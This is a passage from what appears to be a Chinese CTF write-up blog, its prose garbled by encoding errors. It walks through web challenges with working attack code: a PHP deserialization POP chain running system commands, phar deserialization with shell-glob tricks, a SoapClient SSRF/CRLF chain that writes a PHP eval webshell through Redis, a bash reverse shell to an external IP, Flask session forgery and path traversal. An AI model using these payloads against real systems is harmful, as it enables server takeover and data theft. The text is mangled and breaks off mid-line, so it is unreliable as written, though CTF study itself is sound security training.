invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘call&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$sor1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span>-&gt;hint = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;ctf = <span class="variable">$secret</span>;</span><br><span class="line"><span class="variable">$secret</span>-&gt;code = <span class="variable">$sor1</span>;</span><br><span class="line"><span class="variable">$sor1</span>-&gt;key = <span class="variable">$fine</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;cmd = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;content = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);<span class="comment">#æ›´æ”¹fineå±æ€§ç»•è¿‡wakeup</span></span><br><span class="line"><span class="variable">$a</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hade-waiboâ€“å¤ç°"><a href="#hade-waiboâ€“å¤ç°" class="headerlink" title="hade_waiboâ€“å¤ç°"></a>hade_waiboâ€“å¤ç°</h2><p>cancanneed å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><p>è·å¾—index.php,file.php,class.phpæºç </p><p>å®¡è®¡class.phpçš„å†…å®¹ï¼Œå¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“è¿™æ˜¯pharååºåˆ—åŒ–+RCEã€‚</p><p>éœ€è¦ç»•è¿‡wakeupå’Œæ­£åˆ™ã€‚</p><p>wakeupæ˜¯æƒ³ç”¨å¸¸è§„çš„å±æ€§ä¸ªæ•°ç»•è¿‡ï¼Œä½†æ˜¯ä¸è¡Œï¼Œç„¶åæ­£åˆ™æƒ³ä¸å‡ºæ¥ã€‚ã€‚</p><hr><p>ç„¶åçœ‹äº†å¤§ä½¬ä»¬çš„wpåçŸ¥é“ï¼Œåœ¨è¿™é“é¢˜çš„phpç‰ˆæœ¬ä¸‹<code>ç”¨å¸¸è§„çš„å±æ€§ä¸ªæ•°ç»•è¿‡</code>æ˜¯æ— æ•ˆçš„ã€‚</p><p>æœ‰ä¸¤ä¸ªæ€è·¯</p><ol><li><p>å¸ˆå‚…åšå®¢ï¼š<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">https://blog.csdn.net/trytowritecode/article/details/127513176</a></p><blockquote><p>æ€»ç»“ï¼š</p><p>å…ˆä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh  (è¿™é‡Œå¸ˆå‚…å†™çš„æ˜¯/bashï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æ—¶æ˜¯ä¸å¯ä»¥çš„ï¼Œ/shæ˜¯å¯ä»¥çš„)</span></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p>çš„æ–‡ä»¶ï¼Œç„¶åé‡æ–°ç™»å½•ä¸€ä¸ªåä¸º<code>. ./*</code>çš„ç”¨æˆ·ä¸Šä¼ pharæ–‡ä»¶ï¼Œè§¦å‘ååºåˆ—åŒ–è¦†ç›–Test-&gt;$valueçš„å€¼ä¸º<code>. ./*</code>,ä»è€Œæ‰§è¡Œ<code>system(&#39;. ./*&#39;)</code>,å®é™…ä¸Šæ˜¯<code>ls /</code></p></blockquote><p>åŸç†å¦‚ä¸‹</p><p>shellä¸­<code>./*</code>ä¼šå°†ç›®å½•ä¸‹çš„æŒ‰å­—å…¸æ’åºçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å½“ä½œshellè„šæœ¬æ‰§è¡Œ.</p><p><img src="/../images/image-20221027144023202-1687419303717.png" alt="image-20221027144023202"></p><p>è§£é¢˜</p><p><strong>ç»•è¿‡Test::wakeupï¼Œä½¿å¾—Test-&gt;valueçš„å€¼ä¸ºæˆ‘ä»¬æƒ³è¦çš„ã€‚</strong></p><p>è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>åœ¨phpé‡Œ&amp;ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014-1687419303718.png" alt="image-20221026153815014"></p><p>æ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯æ§å˜é‡ï¼Œç„¶åè®©<code>Test-&gt;value =  &amp;å˜é‡</code>ï¼Œè¿™æ ·<code>Test-&gt;value</code>å°±æ˜¯å¯æ§çš„äº†ã€‚</p><p>åœ¨User::wakeupä¸­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç™»å½•æ—¶çš„ç”¨æˆ·åæ¥æ§åˆ¶<code>Test-&gt;value</code>çš„å€¼ã€‚</p><p>è¿™é‡Œè´´ä¸Šå¸ˆå‚…çš„payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$b-&gt;username=new Test(); è¿™ä¸ªä¸éœ€è¦</span></span><br><span class="line"><span class="comment">//åŒæ—¶ååºåˆ—åŒ–Userå’ŒTestç±»</span></span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink(&quot;SKI12.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;SKI12.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦æ³¨æ„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯Testç±»å…ˆå®Œæˆååºåˆ—åŒ–ï¼ŒUserç±»åå®Œæˆååºåˆ—åŒ–ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿç»•è¿‡Test::wakeup.</p><p>ç„¶åæŒ‰ç…§ä¸Šé¢æ€»ç»“çš„æ­¥éª¤å°±å¯ä»¥äº†ã€‚</p><p>è´´ä¸Šæˆ‘å¤ç°æˆåŠŸçš„å›¾</p><p><img src="/../images/image-20221027150538141-1687419303719.png" alt="image-20221027150538141"></p></li><li><p>å®˜æ–¹wp</p><blockquote><p>æ€»ç»“ï¼šå…ˆå†™å…¥ä¸€ä¸ªæ–‡ä»¶åä¸ºcatçš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨pharååºåˆ—åŒ–è¦†ç›–<code>Test-&gt;$value</code>çš„å€¼ä¸º<code>* /*</code>ï¼Œä»è€Œæ‰§è¡Œ<code>system(&#39;* /*&#39;)</code>,å®é™…ä¸Šæ˜¯<code>cat /*</code></p></blockquote><p>åŸç†å¦‚ä¸‹</p><p>shellä¸­å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤ï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‘½ä»¤ï¼Œå…¶ä»–æ–‡ä»¶åä½œä¸ºå‘½ä»¤å‚æ•°ã€‚</p><p><img src="/../images/image-20221017102117317-1687419303719.png" alt="image-20221017102117317"></p><ul><li>å†™å…¥æ–‡ä»¶</li></ul><p>ç”¨æˆ·åä¸ºæ•°ç»„ç»•è¿‡User::destructä¸­çš„å¼±æ¯”è¾ƒï¼Œä»è€Œç»•è¿‡User::wakeupï¼ŒåŒæ—¶è§¦å‘Test::tostringç±»ï¼Œä»è€Œå†™å…¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨æˆ·å</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼±æ¯”è¾ƒ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">User-&gt;username = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br></pre></td></tr></table></figure><ul><li><p>æ‰§è¡Œå‘½ä»¤</p><p>ä¸ä¸Šä¸€ä¸ªæ€è·¯ä¸€è‡´ã€‚</p></li></ul></li></ol><p>éé¢„æœŸè§£</p><p>ç›´æ¥è¯»å–æ ¹ç›®å½•ä¸‹çš„start.shã€‚ã€‚ã€‚</p><h2 id="EasyLoveâ€“å¤ç°"><a href="#EasyLoveâ€“å¤ç°" class="headerlink" title="EasyLoveâ€“å¤ç°"></a>EasyLoveâ€“å¤ç°</h2><p>åŸç”Ÿç±»SoapClientå‘é€SSRFè¯·æ±‚+CRLFæ¼æ´+redisæ¼æ´</p><p>è®¿é—®hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hint</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çŸ¥é“å¯†ç çš„redis</p><p>å®¡è®¡ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>newäº†ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”è°ƒç”¨äº†è¿™ä¸ªç±»çš„getflag()æ–¹æ³•ï¼Œå†åŠ ä¸Šæ˜¯redisï¼Œå¾ˆæ˜æ˜¾æ˜¯SoapClientç±»ã€‚</p><p>payload</p><blockquote><p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc4</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc4</span>.<span class="string">&#x27;^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$swpu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$swpu</span>-&gt;l61q4cheng = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$swpu</span>));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027164155928-1687419303719.png" alt="image-20221027164155928"></p><p>åå¼¹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.73.212%2F2333%200%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>SUIDææƒ</p><p><img src="/../images/image-20221027165218664-1687419303719.png" alt="image-20221027165218664"></p><h2 id="BlogSystemâ€“å¤ç°"><a href="#BlogSystemâ€“å¤ç°" class="headerlink" title="BlogSystemâ€“å¤ç°"></a>BlogSystemâ€“å¤ç°</h2><p>ä¿¡æ¯æ”¶é›†ï¼Œåœ¨æ–‡ç« ä¸­å‡ºç°äº†keyï¼Œå°è¯•æ„é€ session</p><p><img src="/../images/image-20221104151224136-1687419303719.png" alt="image-20221104151224136"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS E:\scripts\web\flask&gt; python flask-session.py encode -s <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span> -t <span class="string">&quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s</span><br></pre></td></tr></table></figure><p>ä¼ªé€ åèº«ä»½ä¸ºadmin,å¤šäº†ä¸€ä¸ªä¸‹è½½åŠŸèƒ½ã€‚</p><p><img src="/../images/image-20221105124636999-1687419303719.png" alt="image-20221105124636999"></p><p>å¯ä»¥çŒœæµ‹åç«¯æ˜¯ä½¿ç”¨äº†<code>os.path.join()</code>æ¥è¿æ¥pathå‚æ•°ã€‚</p><p>è¿™é‡Œå°è¯•ç›®å½•ç©¿è¶Šï¼Œå¸ˆå‚…æ˜¯å°è¯•å¹¶çŒœæµ‹å‡ºåç«¯çš„è¯­å¥æ˜¯<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code></p><p>å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨<code>os.path.join(path,path1)</code>çš„æ¼æ´ï¼Œåªè¦æ‹¼æ¥çš„è·¯å¾„path1æ˜¯ç»å¯¹è·¯å¾„ï¼Œå°±ä¼šå¿½ç•¥æ‰pathã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/home/khaz&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/home/khaz&#x27;</span></span><br></pre></td></tr></table></figure><p>è¯»å–app.pyæºç </p><p><img src="/../images/image-20221105130144960-1687419303719.png" alt="image-20221105130144960"></p><p>å¯¼å…¥äº†<strong>config</strong> <strong>model</strong> <strong>view</strong>ï¼Œå…¸å‹çš„MVTç»“æ„</p><p><img src="/../images/image-20221105141455843-1687419303719.png" alt="image-20221105141455843"></p><p>å°è¯•è®¿é—®<code>/app/view.py</code>æ— æœï¼Œè®¿é—®<code>/app/view/__init__.py</code>,å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .index <span class="keyword">import</span> index</span><br><span class="line"><span class="keyword">from</span> .blog <span class="keyword">import</span> blog</span><br></pre></td></tr></table></figure><p>è¯»å–æºç  index.py blog.py</p><p>å…³é”®éƒ¨åˆ†</p><ul><li>waf</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line"> Â  Â <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment"># è¿˜è®°å¾—app.pyæ³¨å†Œäº†è“å›¾ï¼Œæ‰€ä»¥è·¯ç”±ä¸º/blog/imgUpload</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line"> Â  Â <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â  Â file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line"> Â  Â  Â  Â file.save(filePath)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line"> Â  Â  Â   &#125;</span><br><span class="line"> Â  Â <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span></span><br><span class="line"> Â  Â  Â   &#125;</span><br></pre></td></tr></table></figure><ul><li>è¯»å–æ–‡ä»¶åŠŸèƒ½ç‚¹</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line"> Â  Â <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line"> Â  Â  Â  Â file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â f = f.read()</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">if</span> waf(f):</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">else</span>:</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line"> Â  Â <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> Â  Â  Â  Â  Â  Â sayings = yaml.load(f, Loader=Loader)</span><br><span class="line"> Â  Â  Â  Â  Â  Â saying = 